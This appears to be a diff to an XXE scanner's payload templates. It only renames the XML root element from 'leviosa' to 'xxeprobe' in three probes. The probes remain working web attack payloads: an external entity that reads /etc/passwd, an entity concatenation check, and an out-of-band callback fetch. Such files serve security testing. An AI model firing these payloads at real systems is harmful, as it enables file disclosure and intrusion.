@@ -1,3 +1,3 @@
-<!DOCTYPE leviosa [<!ENTITY probe SYSTEM "file:///etc/passwd">]><leviosa>&probe;</leviosa>
-<!DOCTYPE leviosa [<!ENTITY left "{left}"><!ENTITY right "{right}"><!ENTITY probe "&left;&right;">]><leviosa>&probe;</leviosa>
-<!DOCTYPE leviosa [<!ENTITY probe SYSTEM "{callback}">]><leviosa>&probe;</leviosa>
+<!DOCTYPE xxeprobe [<!ENTITY probe SYSTEM "file:///etc/passwd">]><xxeprobe>&probe;</xxeprobe>
+<!DOCTYPE xxeprobe [<!ENTITY left "{left}"><!ENTITY right "{right}"><!ENTITY probe "&left;&right;">]><xxeprobe>&probe;</xxeprobe>
+<!DOCTYPE xxeprobe [<!ENTITY probe SYSTEM "{callback}">]><xxeprobe>&probe;</xxeprobe>
